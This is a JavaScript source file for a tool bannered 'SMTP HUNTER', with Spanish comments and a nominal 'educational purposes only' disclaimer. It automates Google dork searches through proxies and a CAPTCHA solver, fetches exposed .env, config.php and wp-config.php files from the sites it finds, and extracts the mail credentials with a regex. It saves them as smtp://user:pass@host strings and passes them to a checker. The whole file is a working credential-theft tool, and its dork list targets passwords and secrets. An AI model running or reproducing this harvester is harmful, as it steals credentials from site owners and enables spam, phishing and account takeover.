const puppeteer = require("puppeteer");
const fakeUa = require("fake-useragent");
const fs = require("fs");
const axios = require("axios");
const readlineSync = require("readline-sync");
const { solveCaptcha } = require("./captcha.js");
const usrAgent = fakeUa();
const https = require("https");
axios.defaults.httpsAgent = new https.Agent({
  rejectUnauthorized: false,
});
const dotenv = require("dotenv").config();
const smtp_checker = require("./app_checker.js");

const colors = {
  reset: "\x1b[0m",
  main: "\x1b[37m",
  title: "\x1b[34m",
  option: "\x1b[32m",
  input: "\x1b[33m",
  error: "\x1b[31m",
};

const dorkDescriptions = [
  "Busca archivos .env con términos sensibles como MAIL_HOST o DB_PASSWORD",
  "Se enfoca en buscar archivos .env o de configuración sensible, evitando repositorios públicos",
  "Apunta a archivos phpinfo o config.php con palabras clave relacionadas con contraseñas y credenciales SMTP",
  "Busca archivos .env que contengan variables MAIL_HOST o credenciales",
  "Dork específico para archivos wp-config.php, que a menudo contienen credenciales de base de datos",
  "Dork para localizar cualquier archivo indexable que contenga información de SMTP o correo",
  "Dork enfocado en archivos de configuración que puedan contener credenciales SMTP",
  "Busca archivos de entorno, configuración o credenciales en índices públicos",
  "Búsqueda específica de variables MAIL y SMTP dentro de archivos .env o de configuración",
];

const dorks = [
  // Busca archivos .env con términos sensibles como MAIL_HOST o DB_PASSWORD, excluyendo sitios como GitHub
  'intitle:"index of" "config" OR "environment" OR "ftp" OR "smtp" intext:".env" OR intext:"DB_PASSWORD" OR intext:"MAIL_HOST" OR intext:"MAIL_PASSWORD"',

  // Enfocado en la búsqueda de archivos .env o archivos de configuración sensibles, evitando repositorios públicos
  'intitle:"index of" ".env" OR "database" OR "password" OR "config" OR "ftp" OR "email" intext:".env" OR intext:"SMTP" OR intext:"MAIL"',

  // Dorks orientados a phpinfo o config.php con palabras clave relacionadas con contraseñas y credenciales SMTP
  'inurl:"/phpinfo.php" OR inurl:"/config.php" "password" OR "ftp" OR "smtp" OR "mail"',

  // Focalizado en la extracción de archivos .env que contengan variables relacionadas con MAIL_HOST o credenciales
  '"MAIL_HOST" OR "MAIL_PASSWORD" ext:env OR ext:yaml OR ext:conf',

  // Dork específico para archivos wp-config.php que suelen contener credenciales de base de datos
  'inurl:"/wp-config.php" "DB_PASSWORD" OR "DB_USER" OR "DB_HOST" OR "SMTP"',

  // Dork para localizar cualquier archivo indexable que contenga información SMTP o mail, excluyendo repositorios conocidos
  'intitle:"index of" "smtp" OR "mail" OR "credentials" OR "config" intext:"SMTP" OR intext:"MAIL_PASSWORD" OR intext:"MAIL_HOST"',

  // Dork enfocado en archivos de configuración que puedan contener credenciales SMTP, evitando GitHub, GitLab y Bitbucket
  'inurl:"/config" OR inurl:".env" "MAIL_HOST" OR "MAIL_PASSWORD" OR "SMTP_SERVER" OR "SMTP_PORT" OR "EMAIL"',

  // Busca archivos environment, configuración o credenciales dentro de archivos públicos, excluyendo sitios de código abierto
  'intitle:"index of" "environment" OR "config" OR "credentials" OR "smtp" intext:"MAIL_USERNAME" OR intext:"MAIL_PASSWORD" OR intext:"DB_PASSWORD"',

  // Búsqueda específica para variables MAIL y SMTP dentro de archivos .env o de configuración
  'intext:"MAIL_" OR intext:"SMTP_" ext:env OR ext:yaml OR ext:config OR ext:conf',
];
function deleteDuplicates(archivo1, archivo2) {
  const lineas1 = fs.readFileSync(archivo1, "utf8").split("\n");
  const lineas2 = fs.readFileSync(archivo2, "utf8").split("\n");

  const lineasUnicas1 = [];
  const lineasUnicas2 = [];

  lineas1.forEach((linea) => {
    if (!lineasUnicas1.includes(linea.trim())) {
      lineasUnicas1.push(linea.trim());
    }
  });

  lineas2.forEach((linea) => {
    if (!lineasUnicas2.includes(linea.trim())) {
      lineasUnicas2.push(linea.trim());
    }
  });

  fs.writeFileSync(archivo1, lineasUnicas1.join("\n"));
  fs.writeFileSync(archivo2, lineasUnicas2.join("\n"));
}
(async () => {
  console.clear();
  console.log(`
    ███████╗███╗   ███╗████████╗██████╗     ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
    ██╔════╝████╗ ████║╚══██╔══╝██╔══██╗    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
    ███████╗██╔████╔██║   ██║   ██████╔╝    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
    ╚════██║██║╚██╔╝██║   ██║   ██╔═══╝     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
    ███████║██║ ╚═╝ ██║   ██║   ██║         ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
    ╚══════╝╚═╝     ╚═╝   ╚═╝   ╚═╝         ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
    Solo para propositos educativos | By: FontalvoJS
    `);

  dorkDescriptions.forEach((description, index) => {
    console.log(
      `${colors.reset}(${index + 1})${colors.option} ${description}${
        colors.reset
      }`
    );
  });
  console.log(
    `${colors.reset}(16)${colors.option} Pega tu propio dork${colors.reset}`
  );
  console.log(
    `${colors.reset}(17)${colors.option} Personalizar dork predefinido${colors.reset}`
  );

  const userChoice = readlineSync.questionInt(
    `${colors.input}Selecciona una opcion (1-17): ${colors.reset}`
  );

  let selectedDork;

  if (userChoice >= 1 && userChoice <= 15) {
    selectedDork = dorks[userChoice - 1];
  } else if (userChoice === 16) {
    selectedDork = readlineSync.question(
      `${colors.input}Ingresa tu propio dork: ${colors.reset}`
    );
  } else if (userChoice === 17) {
    console.clear();
    console.log(
      `${colors.title}====================================\n${colors.reset} Selecciona cualquier dork para que puedas personalizarlo:\n`
    );

    dorks.forEach((dork, index) => {
      console.log(`${colors.reset}(${index + 1})${colors.option} ${dork}`);
    });

    console.log(
      `${colors.input}\n Despues de haberlo copiado, ingresalo para continuar con la busqueda personalizada ${colors.reset}`
    );
    readlineSync.question();
    selectedDork = readlineSync.question(
      `${colors.input} Ingresa tu dork: ${colors.reset}`
    );
  } else {
    console.log(`${colors.error} Opcion incorrecta.${colors.reset}`);
    process.exit(1);
  }
  const executablePath = readlineSync.question(
    `${colors.input}Ingresa la ruta del navegador (por ejemplo, C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe): ${colors.reset}`
  );
  console.log(
    `=================\n${colors.reset}Esperando servicio recaptcha...`
  );
  const proxyUrl = process.env.PROXY_HOST_PORT;
  const browser = await puppeteer.launch({
    args: [
      "--usr-agent=" + usrAgent,
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--proxy-server=" + proxyUrl,
      "--ignore-certificate-errors",
    ],
    headless: false,
    // RUTA DEL NAVEGADOR
    executablePath,
  });
  const page = await browser.newPage();
  await page.authenticate({
    username: process.env.PROXY_USERNAME,
    password: process.env.PROXY_PASSWORD,
  });
  page.setDefaultNavigationTimeout(0);

  page.on("dialog", async (dialog) => {
    if (dialog.type() === "beforeunload") {
      await dialog.accept();
    }
  });
  await page.goto("https://www.google.com");
  const googleQuestion = await page.$('button[id="L2AGLb"]');
  if (googleQuestion) {
    await googleQuestion.click();
  }
  await page.evaluate(() => {
    window.scrollTo(0, document.body.scrollHeight);
  });
  await page.type('textarea[name="q"]', selectedDork);
  await page.keyboard.press("Enter");
  await new Promise((resolve) => setTimeout(resolve, 2000));
  await solveCaptcha(page);
  console.log(`=================`);
  console.log(`${colors.reset}Obteniendo todas las URLS encontradas...`);
  console.log(`=================`);

  // Función para recolectar todas las URLs de los resultados de búsqueda
  async function collectAllUrls() {
    let allUrls = [];

    while (true) {
      await new Promise((resolve) => setTimeout(resolve, 1000));

      const links = await page.evaluate(() => {
        const elements = document.querySelectorAll('a[jsname="UWckNb"]');
        return Array.from(elements).map((element) => {
          const href = element.href;
          if (href.includes("freebsd")) {
            return href + "mailer/smtp.m4";
          } else if (href.endsWith("/")) {
            return href + ".env";
          } else {
            return href;
          }
        });
      });

      allUrls.push(...links);

      const nextButtonExists = await page.evaluate(() => {
        const nextButton = document.querySelector("a#pnnext");
        return nextButton !== null;
      });

      if (nextButtonExists) {
        console.log(`🔄 Analizando servidores vulnerables...`);
        try {
          await Promise.all([
            page.click("a#pnnext"),
            page.waitForNavigation({ waitUntil: "domcontentloaded" }),
          ]);
        } catch (error) {
          console.log("Error clicking on the next page button:", error.message);
          break;
        }
      } else {
        try {
          const res = await solveCaptcha(page, true);
          if (res === 404 || !res) {
            break;
          }
        } catch (err) {
          process.exit(0);
        }
      }
    }

    return allUrls;
  }

  const axiosRetry = async (url, retries = 2, timeout = 10000) => {
    try {
      const response = await axios.get(url, {
        timeout: timeout,
        headers: { "User-Agent": usrAgent },
      });
      return response;
    } catch (error) {
      if (retries > 0) {
        return await axiosRetry(url, retries - 1, timeout);
      } else {
        console.log(`❌ Error with ${url}: ${error.message}`);
        return null;
      }
    }
  };

  const processEnvUrls = async (urls) => {
    const chunkSize = 10;
    const chunks = [];

    for (let i = 0; i < urls.length; i += chunkSize) {
      chunks.push(urls.slice(i, i + chunkSize));
    }

    const smtpFilePath = "smtp_extracted.txt";
    let existingSmtpUrls = fs.readFileSync(smtpFilePath, "utf-8");

    const validateAndSaveUrl = (smtpUrl) => {
      if (smtpUrl && !existingSmtpUrls.includes(smtpUrl)) {
        // Verificar si la URL ya existe en el archivo
        const smtpUrls = existingSmtpUrls.split("\n");
        if (!smtpUrls.includes(smtpUrl)) {
          if (!smtpUrl.includes("null")) {
            console.log(`🟢 FOUND`);
            console.log(`SMTP: ${smtpUrl.slice(0, 40)}...`);
            fs.appendFileSync(
              smtpFilePath,
              `${smtpUrl.toLowerCase()}\n`,
              { flag: "a" },
              (err) => {
                if (err) {
                  console.log(`⛔️ Error writing to file: ${err}`);
                }
              }
            );
          }
        } else {
          console.log(`🙅‍♂️ URL ya existe en el archivo`);
        }
      }
    };

    const parseAndFormatSmtpUrl = (creds) => {
      const { host, port, user, pass } = creds;
      if (host && port && user && pass) {
        return `smtp://${user}:${pass}@${host}:${port}`;
      }
      return null;
    };

    for (const chunk of chunks) {
      const promises = chunk.map((url) =>
        axios
          .get(url, {
            timeout: 10000,
            headers: {
              "User-Agent": usrAgent,
            },
          })
          .catch((error) => {
            if (error.response?.status === 404) {
              return null;
            } else if (error.response?.status === 403) {
              return null;
            } else if (error.response?.status === 500) {
              return null;
            } else {
              console.log(`Unknown error: ${error.message}`);
            }
          })
      );

      const responses = await Promise.all(promises);
      const smtpCredsMap = {
        MAIL_HOST: "host",
        MAIL_PORT: "port",
        MAIL_USERNAME: "user",
        MAIL_PASSWORD: "pass",
        MAIL_ENCRYPTION: "secure",
        SMTP_HOST: "host",
        SMTP_PORT: "port",
        SMTP_USER: "user",
        SMTP_PASS: "pass",
        // Agrega más mapeos según sea necesario
      };
      responses.forEach((response) => {
        if (response?.data) {
          const envContent = response.data;
          const smtpCreds = {};
          const smtpRegex =
            /MAIL_(?:HOST|USERNAME|PASSWORD|PORT|ENCRYPTION|FROM_ADDRESS|FROM_NAME)\s*=\s*(.+)/gi;
          let match;
          while ((match = smtpRegex.exec(envContent)) !== null) {
            const key = match[0].split("=")[0].trim();
            const value = match[1].trim();

            if (smtpCredsMap[key]) {
              smtpCreds[smtpCredsMap[key]] = value;
            }
          }

          if (Object.keys(smtpCreds).length >= 3) {
            const smtpUrl = parseAndFormatSmtpUrl(smtpCreds);
            validateAndSaveUrl(smtpUrl);
          }
        }
      });
    }
  };

  const allUrls = await collectAllUrls();
  console.log(
    `=================\n${colors.reset}Collected ${allUrls.length} URLs for analysis.`
  );
  await processEnvUrls(allUrls);
  await smtp_checker();
  deleteDuplicates("smtp_extracted.txt", "smtp_checked.txt");
  console.log(`${colors.title}Scanning Completed!`);
  console.log(`====================================`);
  process.exit(0);
})();
